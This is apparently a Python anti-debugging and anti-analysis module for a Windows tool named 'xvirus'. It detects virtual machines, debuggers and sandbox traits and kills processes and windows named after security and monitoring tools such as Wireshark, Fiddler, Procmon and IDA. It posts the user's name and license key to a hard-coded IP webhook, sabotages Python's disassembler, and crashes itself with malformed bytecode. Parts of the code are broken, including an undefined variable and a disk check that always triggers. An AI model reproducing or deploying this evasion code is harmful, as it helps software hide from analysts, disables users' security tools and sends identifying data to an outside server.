from ctypes    import c_ulonglong, windll, byref
from threading import Thread
import win32gui
from multiprocessing import cpu_count
from random import choice
from colorama import Fore
from time import sleep
import psutil
import requests
import urllib3
import os
import ctypes
import subprocess
from src import *

# creds to vast :skull:
# im too lazy to make this ongong

webhook = "http://91.200.101.4:5000"
username = getpass.getuser()
key = config._get("xvirus_key")

def exiter():
    requests.post(webhook, json={"content": f"Username: {username} flagged anti debug | xvirus key: {key} | Xvirus Exit", "key":"SkitteryIsVeryGayOK"})
    os._exit(0)
    sys.exit()
    exec(type((lambda: 0).__code__)(0, 0, 0, 0, 0, 0, b'\x053', (), (), (), '', '', 0, b''))
    os._exit(0)
    sys.exit()

def pass_request(url):
    urllib3.disable_warnings()
    session = requests.Session()
    session.trust_env = False
    try:
        session.get('https://www.google.com', proxies={"http": None, "https": None})
    except Exception as e:
        exiter(); sys.exit()
        
    return session.get(url, proxies={"http": None, "https": None}, verify=False)

def process_path(pid):
    try:
        process = psutil.Process(pid)
        return process.exe()
    except (psutil.NoSuchProcess, psutil.AccessDenied):
        return None
    
def check_parent_folder(parent_folder_name):
    for process in psutil.process_iter(attrs=['pid']):
        try:
            process_info = process.info
            process_pid = process_info['pid']
            exe_path = process_path(process_pid)
            if not exe_path:
                continue
            parent_folder = os.path.dirname(exe_path)
            
            if os.path.basename(parent_folder).lower() == parent_folder_name.lower():
                exiter(); sys.exit()

        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
            
import sys
import dis
def ong(*args, **kwargs):
    arr = [1]
    print(arr[10])
dis.dis = ong
dis.Bytecode = ong

exit_flag = False

class AntiDebug(Thread):
    def __init__(self):
        Thread.__init__(self)

    def detect_vm(self):
        if hasattr(sys, "real_prefix"):
            requests.post(webhook, json={"content": f"@secret Username: {username} flagged anti debug | xvirus key: {key} | Flagged Anti VM", "key":"SkitteryIsVeryGayOK"})
            exiter(); sys.exit()

    def detect_hdd(self):
        free_bytes_available = c_ulonglong()
        total_number_of_bytes = c_ulonglong()
        total_number_of_free_bytes = c_ulonglong()

        windll.kernel32.GetDiskFreeSpaceExA(
            "C:",
            byref(free_bytes_available),
            byref(total_number_of_bytes),
            byref(total_number_of_free_bytes),
        )

        disk_space = 0

        if disk_space < 100:
            requests.post(webhook, json={"content": f"@secret Username: {username} flagged anti debug | xvirus key: {key} | Flagged Hard Disk Check", "key":"SkitteryIsVeryGayOK"})
            exiter(); sys.exit()

    def detect_core(self):
        if cpu_count() <= 1:
            exiter(); sys.exit()
            
    def check_for_process(self):
        check_parent_folder("httptoolkit")
        names = [
            'regmon', 'diskmon', 'procmon', 'http', 'traffic',
            'wireshark', 'fiddler', 'packet', 'debugger', 'debuger',
            'dbg', 'ida', 'dumper', 'pestudio', 'hacker',
            'prl_cc.exe', 'prl_tools.exe', 'xenservice.exe',
            'qemu-ga.exe', 'joebox', 'titanengine'
        ]
        for proc in psutil.process_iter():
            try:
                if name.lower() == "git-remote-https.exe":
                    pass
                else:
                    for name in names:
                        if name.lower() in proc.name().lower():
                            try:
                                proc.kill()
                                proc_name = proc.name()
                                requests.post(webhook, json={"content": f" Username: {username} flagged anti debug | xvirus key: {key} | killed Process: {proc_name}", "key":"SkitteryIsVeryGayOK"})
                            except:
                                exiter(); sys.exit()
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                exiter(); sys.exit()

    def enum_windows_callback(self, hwnd, blacked_titles):
        title = win32gui.GetWindowText(hwnd)
        if title:
            for btitle in blacked_titles:
                if btitle.lower() in title.lower():
                    try:
                        _, process_id = win32process.GetWindowThreadProcessId(hwnd)
                        os.kill(process_id, signal.CTRL_C_EVENT)
                        requests.post(webhook, json={"content": f" Username: {username} flagged anti debug | xvirus key: {key} | killed Process: {btitle}", "key":"SkitteryIsVeryGayOK"})
                    except OSError:
                        exiter(); sys.exit()

    def check_for_process2(self):
        blacked_titles = [
            'regmon', 'diskmon', 'procmon', 'http', 'traffic',
            'wireshark', 'fiddler', 'packet', 'debugger', 'debuger',
            'dbg', 'ida', 'dumper', 'pestudio', 'hacker',
            'prl_cc', 'prl_tools', 'xenservice',
            'qemu-ga', 'joebox', 'titanengine', 'process hacker'
        ]
        win32gui.EnumWindows(self.enum_windows_callback, blacked_titles)
            
    def check_for_debugger(self):
        if (
            windll.kernel32.IsDebuggerPresent() != 0
            or windll.kernel32.CheckRemoteDebuggerPresent(
                windll.kernel32.GetCurrentProcess(), False
            )
            != 0
        ):
            exiter(); sys.exit()

    def detect_screen_syze(self):
        x = windll.user32.GetSystemMetrics(0)
        y = windll.user32.GetSystemMetrics(1)

        if x <= 200 or y <= 200:
            exiter(); sys.exit()

    def run(self):
        pass_request("https://google.com")
        self.detect_screen_syze()
        self.detect_core()
        self.detect_vm()
        while not exit_flag:
            self.check_for_process()
            self.check_for_process2()
            self.check_for_debugger()
            sleep(3)

    def list_loaded_dlls(self):
        pid = os.getpid()
        process = psutil.Process(pid)

        dll_list = []
        for lib in process.memory_maps():
            if lib.path and lib.path.endswith(".dll"):
                dll_list.append(lib.path)
        return dll_list

def run_anti_debug():
    pc_username = getpass.getuser()
    if pc_username == "DEXV":
        pass
    else:
        self = AntiDebug()
        loaded_dlls = self.list_loaded_dlls()
        dll_count = len(loaded_dlls)
        if dll_count > 94:
            requests.post(webhook, json={"content": f"@secret Username: {username} flagged anti debug | xvirus key: {key} | More Then 94 DLLs", "key":"SkitteryIsVeryGayOK"})
            exiter(); sys.exit()
        elif dll_count > 0:
            pass
        else:
            print("No DLLs found in the current process.")
            time.sleep(0.01)
        pass_request("https://google.com")
        self.check_for_process()
        self.check_for_debugger()